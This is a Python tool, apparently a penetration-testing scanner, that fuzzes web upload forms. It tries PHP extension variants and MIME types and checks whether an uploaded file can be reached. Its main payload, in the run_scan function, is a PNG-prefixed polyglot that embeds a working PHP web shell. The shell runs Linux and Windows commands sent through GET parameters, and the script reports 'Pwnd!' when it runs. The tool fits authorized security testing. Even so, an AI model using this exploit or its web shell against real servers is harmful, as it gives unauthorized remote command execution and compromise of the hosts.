#!/usr/bin/python3
import difflib
import sys
from bs4 import BeautifulSoup
import requests
import re
import argparse
import hashlib
from urllib.parse import urljoin

parser = argparse.ArgumentParser(description="File Upload Vulnerability Assessment Tool")
parser.add_argument("URL", help="insert URL")
parser.add_argument("--cookies", default='', required=False, help='insert Cookies "PHPSESSID=<cookies>, Cookies=<cookies>"')
parser.add_argument("--proxy", "-x", default='', required=False, help="redirect trafic trought proxy <127.0.0.1:8080>")
parser.add_argument("--csrf", default=False, required=False, action="store_true", help="csrf token")
parser.add_argument("--upload", "-u", default=False, required=False, help="Directory where webapp stores uploaded file")
parser.add_argument("-v", "--verbose", action="count", default=0, help = "Verbose mode")
parser.add_argument("--skip-mimetype", default=False, required=False, action="store_true", help = "Skip MIME type fuzzing")
args = parser.parse_args()


def banner():
    print("\033[32m" + r"""

    ______                 __    _     
   / ____/_  ______  _____/ /_  (_)____
  / /_  / / / / __ \/ ___/ __ \/ / ___/
 / __/ / /_/ / / / / /__/ / / / (__  ) 
/_/    \__,_/_/ /_/\___/_/ /_/_/____/      

    File Upload Vulnerability Scanner
    v1.1

""" + "\033[0m")


###GLOBAL VARIABLE DEF
URL = args.URL
cookies = args.cookies
proxy = args.proxy
CSRF = args.csrf
upload_dir = args.upload



def regex_url(text_to_sanitize: str) -> str:
    """
    Function used to prepare the URL correctly so that it is in the following format
    http://<$ip>/

    :param text_to_sanitize: IP to sanitize and put in the correct format
    :return: sanitized value
    """

    if not text_to_sanitize.startswith(('http://', 'https://')):
        text_to_sanitize = "http://" + text_to_sanitize

    if not text_to_sanitize.endswith('/'):
        text_to_sanitize = text_to_sanitize + "/"

    return text_to_sanitize


def guessing_file_name(value_to_validate: list, extension: str, fake_image: str) -> dict[str, list[str]]:
    """
    Tests only file extensions that appear to be accepted by the application.
    Generates possible filenames used by the application when storing uploaded files.

    This is done by:
    (1) Parsing the server response to identify declared filenames
    (2) Hashing the uploaded file content using MD5 and SHA1 (some applications store files using hashes)

    :param value_to_validate: difference in response body between a known valid request
                            (valid_request_values["text_body"]) and the request under test
                            (to_be_validate_request_values["text_body"]); used to identify new
                            filenames with potentially valid extensions not present in the original response

    :param extension: uploaded file name (e.g., "test.php")
    :param fake_image: fake image used for upload (PNG content with embedded PHP code)
    :return: possible filenames used to store uploaded files
    """

    list_ = [extension]
    extension_regex = extension.split(".")[-1]  # php

    ### (1)
    for word in value_to_validate:
        match = re.search(rf"[A-Za-z0-9_-]+\.{extension_regex}$",word)  # Match only name.php not " .php" or other special characters
        if match and match.group(0) != extension:
            list_.append(match.group())

    ### (2)
    md5 = hashlib.md5(fake_image).hexdigest() + '.' + extension_regex
    sha1 = hashlib.sha1(fake_image).hexdigest() + '.' + extension_regex
    if md5 not in list_:
        list_.append(md5)
    if sha1 not in list_:
        list_.append(sha1)

    name_to_test = {extension: list_}
    return name_to_test


def test_upload(upload_dir: str, name_to_test: dict, s) -> None:
    """
    #This function tests a list of candidate filenames to determine which ones are valid and tracks the naming pattern used by the application to store uploaded files (e.g., original name, response-derived name, MD5, SHA1).

    :param upload_dir: directory where accepted files are uploaded
    :param name_to_test: contains all possible names with which the application might have saved the file
    """


    for value in name_to_test.values():  #Identifies how images are saved on the server. If length is 3, nothing was extracted from the original response body
        if len(value) == 3:
            name_to_test_type = ["Original file name", "MD5", "SHA1"]
        else:
            name_to_test_type = ["Original file name", "Name in body", "MD5", "SHA1"]


    match = re.match(r"(https?://[^/]+)", URL)
    base_url = match.group(1) + "/"
    found = False

    if upload_dir.startswith('/'):
        upload_dir = upload_dir.replace('/', '', 1)
    if not upload_dir.endswith('/'):
        upload_dir = upload_dir + '/'

    for key, values in name_to_test.items():
        for saved_method, value in zip(name_to_test_type, values):
            url = base_url + upload_dir + value
            response = s.get(url)

            if response.status_code == 200:
                if not found:
                    vprint("[+] File saved using method: \"{}\"\n".format(saved_method))
                    found = True

                vprint("file {} successfully uploaded with name: {}".format(key, value))

                if "__funchis__4005__kyra__" in response.text.lower():
                    print("\033[34m{}\033[00m \033[33m(Pwnd!)\033[0m".format(url))
                break

    if not found and name_to_test:
        print("[-] Guessing Filename failed")


def extract_input_form(s) -> tuple[str, str, str, dict]:
    """
    Extracts the fields to be submitted in the post request to perform the image upload.
    If no upload function exists, the script execution is terminated.
    :return: name, action, method, tags_array
    - name: name of the file-type input field (e.g., "fileToUpload")
    - action: name of the PHP file being uploaded (e.g., "upload.php")
    - method: method to use for the upload (e.g., "post")
    - tags_array: array containing the required fields (including hidden ones) to be sent with the image (e.g., {"PHPSESSID": "testcookies", "CSRFToken": "testtoken"})
    """
    r = s.get(URL)
    r.raise_for_status()  # Check if the request was successful (status code 200-299);
    html_content = r.text

    # Parsing HTML content
    soup = BeautifulSoup(html_content, 'html.parser')
    tags = soup.find_all('form')
    for tag in tags:
        found = False  # Verify if update the fields to send in the post or not (through tags_array)
        tags_array = {}  # Define values to pass in the post (for hidden fields)

        # Search for all forms that have an input of type file (file upload)
        input_form = tag.find_all('input')  # Takes all input tags in the form

        for input_test in input_form:
            if input_test.get('type') == 'file':
                action = tag.get('action')  # Contains the name of the PHP file that performs the upload (upload.php)
                method = tag.get('method')
                # img_src = soup.find('img').get('src') #Find where the image is saved
                # Extract input data for upload name
                name = input_test.get('name')
                found = True

        if found:
            for input_test in input_form:
                if input_test.get('name') and input_test.get('value') and (input_test.get('type') == "hidden" or input_test.get('type') == "submit"):
                    tags_array.update({input_test.get('name'): input_test.get('value')})
            break

    if not found:
        print("No Upload Function Found")
        sys.exit(1)

    return name, action, method, tags_array


def clean_html_text(html: str) -> str:
    """
    Sanitize response output to extract only visible text, removing HTML tags, scripts, styles, and normalizing whitespace. This helps to compare the textual content more effectively between the two responses valid_request and to_be_validate_request, ignoring formatting differences or non-visible elements.
    :param html: HTML content to sanitize
    :return: clean and normalized text
    """
    soup_san = BeautifulSoup(html, "html.parser")

    # Remove Noise (script, style, etc.)
    for tag in soup_san(["script", "style"]):
        tag.extract()

    # Extract Visible Text
    text = soup_san.get_text(separator="\n")

    # Normalize whitespace
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    return "\n".join(lines)


def ext_validator(valid_request_values: dict, to_be_validate_request_values: dict, extension: str, fake_image: str, scan_type: str) -> tuple[bool, str, dict[str, list[str]]]:
    """
    Validates the file extension under test (e.g., "test.php") by comparing it against a known allowed extension (.png).

    :param valid_request_values: dictionary containing values from the valid request ("redirect", "status_code", "text_body")
    :param to_be_validate_request_values: dictionary containing values from the request under test ("redirect", "status_code", "text_body")
    :param extension: file name to validate (e.g., "test.php")
    :param fake_image: fake image used for upload (PNG content with embedded PHP code)
    :param scan_type: type of scan executed
    :return: tuple containing validation result, a message, and a dictionary of candidate values
    """

    deny_keywords = ["invalid", "forbidden", "denied", "blocked", "rejected", "refused", "prohibited", "unauthorized",
                     "restricted", "banned", "disallowed", "unsupported", "unacceptable", "error", "failed", "failure",
                     "illegal", "dangerous", "unsafe", "violation", "policy", "exceeded", "limit", "validation", "not",
                     "only"]

    if not valid_request_values["redirect"] == to_be_validate_request_values["redirect"]:
        return False, "different redirect status", {}
    elif not valid_request_values["status_code"] == to_be_validate_request_values["status_code"]:
        return False, "no matching status_code", {}
    else:
        diff1 = clean_html_text(valid_request_values["text_body"])  # Cleaning for better comparison between the two responses
        diff2 = clean_html_text(to_be_validate_request_values["text_body"])
        diff = difflib.ndiff(diff1.split(), diff2.split())
        value_to_validate = [line.lower().replace('+ ', '') for line in diff if line.startswith('+ ')]  # or line.startswith('- ')]
        if value_to_validate: vprint(value_to_validate) #Shows the text in the body that differs between the two responses (valid request and request under test)

        if any(word in deny_keywords for word in value_to_validate):
            return False, "body", {}

        name_to_test = guessing_file_name(value_to_validate, extension, fake_image)
        return True, "", name_to_test

def extract_name_through_mimetype(mimetype: str) -> str:
    # Implementation for extracting name through MIME type
    mime_to_ext = {"image/jpeg": "jpg", "image/png": "png", "image/gif": "gif", "image/webp": "webp", "image/svg+xml": "svg", "image/bmp": "bmp", "image/x-icon": "ico", "application/pdf": "pdf"}
    return "test." + mime_to_ext.get(mimetype)

def run_scan(s, scan_type):
    """
    Main scanning routine.

    Performs the following steps:
    (1) Identifies the upload form and required parameters
    (2) Sends a baseline request using a known valid file (PNG)
    (3) Tests multiple potentially dangerous extensions (e.g., .php variants)
    (4) Compares responses to detect filtering mechanisms
    (5) Collects extensions that appear to be allowed
    (6) Optionally attempts to locate uploaded files on the server
    :param scan_type: type of scan executed
    :param s: initialized requests session
    """


    ### DECLARING VARIABLE
    global valid_format
    valid_format = []
    original_verbose = args.verbose
    allowed = []
    not_allowed = []
    valid_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'
    fake_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82<html><body><h1><?php echo "__FUnchis__".(2002+2003)."__KYra__"; ?></h1><h3>Linux Backend</h3><form method="GET"><input type="TEXT" name="cmd_linux" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_linux"])){ system($_GET["cmd_linux"]." 2>&1"); } ?></pre><h3>Windows Backend</h3><form method="GET"><input type="TEXT" name="cmd_win" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_win"])){ system("cmd.exe /c ".$_GET["cmd_win"]." 2>&1"); } ?></pre></body></html>\n'
    php_payloads = {"test.php": fake_image, "test.php2": fake_image, "test.php3": fake_image, "test.php4": fake_image,
                    "test.php5": fake_image, "test.php6": fake_image, "test.php7": fake_image, "test.phps": fake_image,
                    "test.pht": fake_image, "test.phtml": fake_image, "test.phar": fake_image}

    #magick -size 1x1 xc:white -strip -quality 1 test.jpg
    #xxd -p <$image> | tr -d '\n' | sed 's/../\\x&/g' | sed 's/^/b"/;s/$/"/'
    mime_payloads = {
        "image/jpeg": b"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\xff\xdb\x00\x43\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x47\xff\xd9",
        "image/gif": b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\xf0\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b",
        "image/png": b"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x00\x37\x6e\xf9\x24\x00\x00\x00\x0a\x49\x44\x41\x54\x08\xd7\x63\x68\x00\x00\x00\x82\x00\x81\xdd\x43\x6a\xf4\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82",
        "image/webp": b"\x52\x49\x46\x46\x24\x00\x00\x00\x57\x45\x42\x50\x56\x50\x38\x20\x18\x00\x00\x00\x30\x01\x00\x9d\x01\x2a\x01\x00\x01\x00\x02\x00\x34\x25\xa4\x00\x03\x70\x00\xfe\xfb\x94\x00\x00",
        "image/svg+xml": b'<svg xmlns="http://www.w3.org/2000/svg"></svg>',
        "image/bmp": b"\x42\x4d\x8e\x00\x00\x00\x00\x00\x00\x00\x8a\x00\x00\x00\x7c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\xff\x00\x00\xff\x00\x00\x00\x00\x00\x00\xff\x42\x47\x52\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00",
        "image/x-icon": b"\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x20\x00\x30\x00\x00\x00\x16\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x20\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00",
        "application/pdf": b"\x25\x50\x44\x46\x2d\x31\x2e\x33\x20\x0a\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x50\x61\x67\x65\x73\x20\x32\x20\x30\x20\x52\x0a\x2f\x54\x79\x70\x65\x20\x2f\x43\x61\x74\x61\x6c\x6f\x67\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x32\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x50\x61\x67\x65\x73\x0a\x2f\x4b\x69\x64\x73\x20\x5b\x20\x33\x20\x30\x20\x52\x20\x5d\x0a\x2f\x43\x6f\x75\x6e\x74\x20\x31\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x33\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x50\x61\x67\x65\x0a\x2f\x50\x61\x72\x65\x6e\x74\x20\x32\x20\x30\x20\x52\x0a\x2f\x52\x65\x73\x6f\x75\x72\x63\x65\x73\x20\x3c\x3c\x0a\x2f\x58\x4f\x62\x6a\x65\x63\x74\x20\x3c\x3c\x20\x2f\x49\x6d\x30\x20\x38\x20\x30\x20\x52\x20\x3e\x3e\x0a\x2f\x50\x72\x6f\x63\x53\x65\x74\x20\x36\x20\x30\x20\x52\x20\x3e\x3e\x0a\x2f\x4d\x65\x64\x69\x61\x42\x6f\x78\x20\x5b\x30\x20\x30\x20\x31\x20\x31\x5d\x0a\x2f\x43\x72\x6f\x70\x42\x6f\x78\x20\x5b\x30\x20\x30\x20\x31\x20\x31\x5d\x0a\x2f\x43\x6f\x6e\x74\x65\x6e\x74\x73\x20\x34\x20\x30\x20\x52\x0a\x2f\x54\x68\x75\x6d\x62\x20\x31\x31\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x34\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x35\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x71\x0a\x31\x20\x30\x20\x30\x20\x31\x20\x30\x20\x30\x20\x63\x6d\x0a\x2f\x49\x6d\x30\x20\x44\x6f\x0a\x51\x0a\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x35\x20\x30\x20\x6f\x62\x6a\x0a\x32\x37\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x36\x20\x30\x20\x6f\x62\x6a\x0a\x5b\x20\x2f\x50\x44\x46\x20\x2f\x54\x65\x78\x74\x20\x2f\x49\x6d\x61\x67\x65\x43\x20\x5d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x37\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x38\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x58\x4f\x62\x6a\x65\x63\x74\x0a\x2f\x53\x75\x62\x74\x79\x70\x65\x20\x2f\x49\x6d\x61\x67\x65\x0a\x2f\x4e\x61\x6d\x65\x20\x2f\x49\x6d\x30\x0a\x2f\x46\x69\x6c\x74\x65\x72\x20\x5b\x20\x2f\x52\x75\x6e\x4c\x65\x6e\x67\x74\x68\x44\x65\x63\x6f\x64\x65\x20\x5d\x0a\x2f\x57\x69\x64\x74\x68\x20\x31\x0a\x2f\x48\x65\x69\x67\x68\x74\x20\x31\x0a\x2f\x43\x6f\x6c\x6f\x72\x53\x70\x61\x63\x65\x20\x31\x30\x20\x30\x20\x52\x0a\x2f\x42\x69\x74\x73\x50\x65\x72\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x20\x38\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x39\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x00\xff\x80\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x39\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x30\x20\x30\x20\x6f\x62\x6a\x0a\x2f\x44\x65\x76\x69\x63\x65\x47\x72\x61\x79\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x46\x69\x6c\x74\x65\x72\x20\x5b\x20\x2f\x52\x75\x6e\x4c\x65\x6e\x67\x74\x68\x44\x65\x63\x6f\x64\x65\x20\x5d\x0a\x2f\x57\x69\x64\x74\x68\x20\x31\x0a\x2f\x48\x65\x69\x67\x68\x74\x20\x31\x0a\x2f\x43\x6f\x6c\x6f\x72\x53\x70\x61\x63\x65\x20\x31\x30\x20\x30\x20\x52\x0a\x2f\x42\x69\x74\x73\x50\x65\x72\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x20\x38\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x31\x32\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x00\xff\x80\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x32\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x33\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x34\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x35\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x36\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x37\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x69\x74\x6c\x65\x20\x3c\x46\x45\x46\x46\x30\x30\x37\x34\x30\x30\x36\x35\x30\x30\x37\x33\x30\x30\x37\x34\x30\x30\x30\x30\x3e\x0a\x2f\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x61\x74\x65\x20\x28\x44\x3a\x32\x30\x32\x36\x30\x34\x31\x36\x30\x39\x33\x31\x35\x35\x29\x0a\x2f\x4d\x6f\x64\x44\x61\x74\x65\x20\x28\x44\x3a\x32\x30\x32\x36\x30\x34\x31\x36\x30\x39\x33\x31\x35\x35\x29\x0a\x2f\x50\x72\x6f\x64\x75\x63\x65\x72\x20\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x65\x67\x61\x63\x79\x2e\x69\x6d\x61\x67\x65\x6d\x61\x67\x69\x63\x6b\x2e\x6f\x72\x67\x29\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x78\x72\x65\x66\x0a\x30\x20\x31\x38\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x36\x35\x35\x33\x35\x20\x66\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x31\x30\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x35\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x31\x31\x38\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x32\x39\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x33\x37\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x33\x39\x30\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x34\x32\x38\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x34\x34\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x33\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x35\x31\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x37\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x32\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x34\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x36\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x38\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x39\x30\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x39\x32\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x74\x72\x61\x69\x6c\x65\x72\x0a\x3c\x3c\x0a\x2f\x53\x69\x7a\x65\x20\x31\x38\x0a\x2f\x49\x6e\x66\x6f\x20\x31\x37\x20\x30\x20\x52\x0a\x2f\x52\x6f\x6f\x74\x20\x31\x20\x30\x20\x52\x0a\x2f\x49\x44\x20\x5b\x3c\x63\x65\x38\x62\x65\x65\x35\x32\x35\x64\x36\x37\x33\x36\x65\x39\x38\x32\x35\x32\x36\x31\x62\x31\x39\x61\x39\x62\x35\x31\x37\x31\x39\x66\x39\x64\x63\x34\x62\x62\x37\x32\x38\x65\x39\x35\x63\x66\x37\x30\x36\x37\x61\x32\x31\x34\x32\x62\x30\x33\x62\x33\x36\x32\x3e\x20\x3c\x63\x65\x38\x62\x65\x65\x35\x32\x35\x64\x36\x37\x33\x36\x65\x39\x38\x32\x35\x32\x36\x31\x62\x31\x39\x61\x39\x62\x35\x31\x37\x31\x39\x66\x39\x64\x63\x34\x62\x62\x37\x32\x38\x65\x39\x35\x63\x66\x37\x30\x36\x37\x61\x32\x31\x34\x32\x62\x30\x33\x62\x33\x36\x32\x3e\x5d\x0a\x3e\x3e\x0a\x73\x74\x61\x72\x74\x78\x72\x65\x66\x0a\x31\x30\x38\x32\x0a\x25\x25\x45\x4f\x46\x0a"
    }
    name, action, method, tags_array = extract_input_form(s)


    #Define correct URL
    if action == 'None' or action == '#': action = ''
    final_url = urljoin(URL, action)

    #Define scan type [mime - payload]
    if scan_type == "MIME-TYPE":
        payloads = mime_payloads
        message = "Mime-Type seems to be Allowed"
        args.verbose = False

    elif scan_type == "PAYLOAD":
        payloads = php_payloads
        message = "Extension seems to be Allowed"



    #Testing Valid Extensions      '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'   <-- Original Image
    files = {name: ('test.png', valid_image, "image/png")}
    r = s.post(final_url, files=files, data=tags_array, allow_redirects=True)
    print("Making Request: \033[34m {}\033[00m\n".format(final_url))
    r.raise_for_status()
    valid_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
    vprint("Baseline response values: {}\n".format(valid_request_values))
    name_to_test = {}

    #Uploading Images
    for extension, value in payloads.items():

        if scan_type == "MIME-TYPE":
            # value = b''
            content_type = extension  # extension = image/png
            file_name = extract_name_through_mimetype(content_type)
        elif scan_type == "PAYLOAD":
            # value = fake_image
            content_type = "image/png"
            file_name = extension  # extension = test.php, test.phar ...

        vprint("Testing extension: \033[97m {}\033[00m".format(extension))
        # PNG Magic Byte -> b'\x89PNG\r\n\x1A\n' || Minimal PNG image -> https://png-pixel.com/
        # files = {name: ('test.png', fake_image, "image/png")}
        files = {name: (file_name, value, content_type)}
        if CSRF: name, action, method, tags_array = extract_input_form(s)
        r = s.post(final_url, files=files, data=tags_array, allow_redirects=True)
        to_be_validate_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
        result, message_occurred, data = ext_validator(valid_request_values, to_be_validate_request_values, file_name, value, scan_type)

        if result:
            vprint("{}\n".format(message))
            name_to_test.update(data)
            allowed.append(file_name)
        else:
            vprint("[!] Possible filter in posture, found in {} \n".format(message_occurred))
            not_allowed.append(file_name)

    print("[+] Allowed: {}".format(allowed))
    vprint("[-] Not Allowed: {}\n".format(not_allowed))

    if upload_dir: test_upload(upload_dir, name_to_test, s)

    if scan_type == "MIME-TYPE":
        valid_format = allowed.copy()

    args.verbose = original_verbose

def init_session():
    #Initialize Session
    s = requests.session()

    # Define Proxy
    if proxy:
        s.proxies.update({'http': proxy, 'https': proxy})
        s.verify = False

    # Define Cookies
    cookies_normalized = {}
    if cookies:
        # OutPut expected --> {'PHPSESSID': 'testcookies', 'COOKIES': "ABCD"}
        cookies_normalized = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookies.strip().split(", ")}
        for key, value in cookies_normalized.items():
            s.cookies.set(key, value)
    return s



def vprint(msg: str):
    """
    Helper function to control user-facing verbose output.

    :param msg: message to print
    """

    if args.verbose > 0:
        print(msg)


def main():
    global URL
    banner()
    URL = regex_url(args.URL)
    s = init_session()

    if not args.skip_mimetype:
        print("\n[*] Extracting Valid Mime-Type\n")
        run_scan(s, "MIME-TYPE")

    print("\n[*] Starting Fuzzing ...\n")
    run_scan(s, "PAYLOAD")


if __name__ == "__main__":
    main()